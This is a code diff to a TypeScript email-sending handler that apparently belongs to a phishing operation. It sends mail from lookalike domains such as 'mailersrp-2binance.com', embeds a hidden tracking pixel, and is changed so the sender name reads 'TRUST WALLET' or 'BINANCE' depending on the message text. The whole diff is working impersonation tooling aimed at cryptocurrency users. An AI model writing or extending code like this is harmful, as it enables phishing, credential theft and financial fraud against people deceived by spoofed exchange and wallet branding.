@@ -298,14 +298,25 @@ const handler = async (req: Request): Promise<Response> => {
     // Add tracking pixel to email content
     emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
 
+    // Determine sender name - use "TRUST WALLET" for Trust Wallet templates
+    const isTrustWalletTemplate = (subject || content || '')
+      .toLowerCase()
+      .includes('trust') || 
+      (subject || content || '')
+      .toLowerCase()
+      .includes('trustwallet');
+    
+    const senderName = isTrustWalletTemplate ? "TRUST WALLET" : "BINANCE";
+
     // Log email sending attempt
     console.log("Sending email to:", to, "with tracking code:", trackingCode);
     console.log("Server IP used:", currentServerIp);
+    console.log("Sender name:", senderName);
 
     const emailResponse = await resend.emails.send({
       from: fromDomain === "mailersrp-2binance.com" 
-        ? "BINANCE <noreply@mailersrp-2binance.com>"
-        : "BINANCE <donotreply@mailersrp-1binance.com>",
+        ? `${senderName} <noreply@mailersrp-2binance.com>`
+        : `${senderName} <donotreply@mailersrp-1binance.com>`,
       to: [to],
       subject: emailSubject,
       html: emailContent,
